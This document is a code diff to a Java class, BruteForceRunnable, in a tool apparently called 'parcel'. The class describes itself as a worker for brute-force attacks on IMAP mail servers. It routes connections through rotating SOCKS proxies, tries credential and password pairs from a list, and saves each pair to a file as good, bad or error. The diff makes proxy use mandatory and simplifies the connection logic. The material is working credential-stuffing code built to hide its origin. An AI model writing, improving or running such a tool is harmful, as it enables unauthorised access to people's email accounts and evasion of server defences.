@@ -5,6 +5,7 @@ import com.chilkatsoft.CkMailboxes;
 import com.chilkatsoft.CkMessageSet;
 import com.chilkatsoft.CkString;
 import lombok.RequiredArgsConstructor;
+import lombok.SneakyThrows;
 import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
 import org.bsoftware.parcel.domain.components.DataContainer;
 import org.bsoftware.parcel.domain.model.Connection;
@@ -22,7 +23,7 @@ import java.util.Optional;
  * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
  *
  * @author Rudolf Barbu
- * @version 1.0.8
+ * @version 1.0.9
  */
 @RequiredArgsConstructor
 public class BruteForceRunnable implements Runnable
@@ -43,11 +44,6 @@ public class BruteForceRunnable implements Runnable
     private static final String NO_CONNECTION_TO_IMAP_SERVER_ERROR = "<error>No connection to IMAP server.</error>";
 
     /**
-     * Defines maximum connection attempts, if connection is refused
-     */
-    private static final int MAXIMUM_CONNECTION_ATTEMPTS = 5;
-
-    /**
      * Defines, if search algorithm is in use
      */
     private static final Boolean SEARCH_LETTERS = Boolean.FALSE;
@@ -58,11 +54,6 @@ public class BruteForceRunnable implements Runnable
     private static final String SEARCH_QUERY = "";
 
     /**
-     * Indicator for proxy usage
-     */
-    private final boolean useProxies;
-
-    /**
      * Callback interface, which is used to deliver messages to service
      */
     private final BruteForceCallback bruteForceCallback;
@@ -71,15 +62,13 @@ public class BruteForceRunnable implements Runnable
      * Main method of brute-force algorithm
      */
     @Override
+    @SneakyThrows
     public void run()
     {
         final CkImap ckImap = new CkImap();
 
-        if (useProxies)
-        {
-            ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
-            ckImap.put_SocksVersion(SOCKS_VERSION);
-        }
+        ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
+        ckImap.put_SocksVersion(SOCKS_VERSION);
 
         try
         {
@@ -93,37 +82,32 @@ public class BruteForceRunnable implements Runnable
                 ckImap.put_StartTls(connection.isTls());
                 bruteForceCallback.handleDecrementCounter(DataType.SOURCE);
 
-                final Status connectionStatus = useProxies ? retrieveProxy(ckImap, connection.getHost()) : connectToServer(ckImap, connection.getHost());
+                final Status retrieveStatus = retrieveProxy(ckImap, connection.getHost());
 
-                if (useProxies && (connectionStatus == Status.BAD))
+                if (retrieveStatus == Status.GOOD)
                 {
-                    break;
+                    FileSystemUtility.saveSourceToFile(executeBruteForceActions(ckImap, source).name().toLowerCase(), source);
+                    ckImap.Disconnect();
                 }
-
-                FileSystemUtility.saveSourceToFile(executeBruteForceActions(connectionStatus, ckImap, source).name().toLowerCase(), source);
-                ckImap.Disconnect();
+                else
+                {
+                    if (retrieveStatus == Status.BAD)
+                    {
+                        break;
+                    }
+                    else if (retrieveStatus == Status.ERROR)
+                    {
+                        FileSystemUtility.saveSourceToFile(Status.ERROR.name().toLowerCase(), source);
+                    }
+                }
             }
         }
-        catch (final IOException | InterruptedException exception)
+        catch (final IOException ioException)
         {
-            bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("Exception occurred, message: %s", exception.getMessage()));
+            bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("I/O exception occurred, message: %s", ioException.getMessage()));
+        }
 
-            if (exception instanceof InterruptedException)
-            {
-                Thread.currentThread().interrupt();
-            }
-        }
-        finally
-        {
-            try
-            {
-                bruteForceCallback.handleThreadInterruption();
-            }
-            catch (IOException ioException)
-            {
-                bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("I/O exception occurred, message: %s", ioException.getMessage()));
-            }
-        }
+        bruteForceCallback.handleThreadInterruption();
     }
 
     /**
@@ -133,7 +117,7 @@ public class BruteForceRunnable implements Runnable
      * @param host particular IMAP server to connect
      * @return Status.GOOD, retrieved a good proxy
      */
-    private Status retrieveProxy(final CkImap ckImap, final String host) throws InterruptedException
+    private Status retrieveProxy(final CkImap ckImap, final String host)
     {
         final CkString currentProxyHostname = new CkString();
 
@@ -141,8 +125,7 @@ public class BruteForceRunnable implements Runnable
         if (!currentProxyHostname.getString().isEmpty())
         {
             final Status connectionStatus = connectToServer(ckImap, host);
-
-            if (connectToServer(ckImap, host) != Status.BAD)
+            if (connectionStatus != Status.BAD)
             {
                 return connectionStatus;
             }
@@ -156,7 +139,6 @@ public class BruteForceRunnable implements Runnable
             bruteForceCallback.handleDecrementCounter(DataType.PROXY);
 
             final Status connectionStatus = connectToServer(ckImap, host);
-
             if (connectionStatus != Status.BAD)
             {
                 return connectionStatus;
@@ -173,27 +155,12 @@ public class BruteForceRunnable implements Runnable
      * @param host particular IMAP server to connect
      * @return Status.GOOD, if successfully connected
      */
-    @SuppressWarnings("BusyWait")
-    private Status connectToServer(final CkImap ckImap, final String host) throws InterruptedException
+    private Status connectToServer(final CkImap ckImap, final String host)
     {
         if (!ckImap.Connect(host))
         {
             if (ckImap.lastErrorXml().contains(NO_CONNECTION_TO_IMAP_SERVER_ERROR))
             {
-                return Status.ERROR;
-            }
-            else if (!useProxies)
-            {
-                for (int index = 0; (!Thread.currentThread().isInterrupted() || (index < MAXIMUM_CONNECTION_ATTEMPTS)); index++)
-                {
-                    Thread.sleep(10_000);
-
-                    if (ckImap.Connect(host))
-                    {
-                        return Status.GOOD;
-                    }
-                }
-
                 return Status.ERROR;
             }
 
@@ -209,13 +176,9 @@ public class BruteForceRunnable implements Runnable
      * @param ckImap IMAP to execute actions
      * @param source source object, which is supplied to perform actions
      */
-    private Status executeBruteForceActions(final Status connectionStatus, final CkImap ckImap, final Source source)
+    private Status executeBruteForceActions(final CkImap ckImap, final Source source)
     {
-        if (connectionStatus == Status.ERROR)
-        {
-            return connectionStatus;
-        }
-        else if (!ckImap.Login(source.getCredential(), source.getPassword()))
+        if (!ckImap.Login(source.getCredential(), source.getPassword()))
         {
             return Status.BAD;
         }
